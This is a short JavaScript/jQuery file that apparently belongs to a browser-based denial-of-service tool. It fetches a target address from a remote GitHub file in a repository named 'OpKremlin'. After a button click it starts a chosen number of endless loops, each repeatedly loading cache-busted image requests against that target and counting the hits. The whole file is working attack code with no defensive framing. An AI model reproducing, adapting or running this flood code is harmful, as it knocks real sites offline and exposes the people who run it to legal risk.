var dest = "";
    var concAttack = 5;
    var attackCount = 0;

    // Load Destination of attack
    $.get( "https://raw.githubusercontent.com/OpKremlin/Op1/main/destination.txt", function( data ) {
        console.log('Destination Loaded: '+data);
        dest = data;
        $("#StartAttack").show();
    });

    //  //  //  //  //
    // Click to start attack
    $( "#StartAttack" ).click(function() {
        // Get value of thr.
        concAttack = $( "#concAttack" ).val();
        // Multiple Attack same Time
        for (let index = 0; index < concAttack; index++) {
            startAttack();
        }
    });

    //  //  //  //  //  //  //
    // Attack Function
    function startAttack(idImg) {
        // Generate Random Number
        var rand = ~~( Math.random() * 99999 ) + 1;
        // Increase Attack Counter
        attackCount++;
        // Create random ID
        var idImg = new Date().getTime() +'_'+ rand;
        // Load Image
        $('#attackBoard').prepend('<img class="imgAtk" id="'+idImg+'" src="'+dest+'?idImg='+idImg+'" width="50" height="50" />');
        // Execution function after load
        $( "#"+idImg ).one("load", function() {
            // Clear Loaded Image
            $(this).remove();
            //Attack Counter:
            $("#atkP").html(attackCount);
            startAttack();
        }).each(function() {
            if(this.complete) {
                $(this).trigger('load');
            }
        });
    }
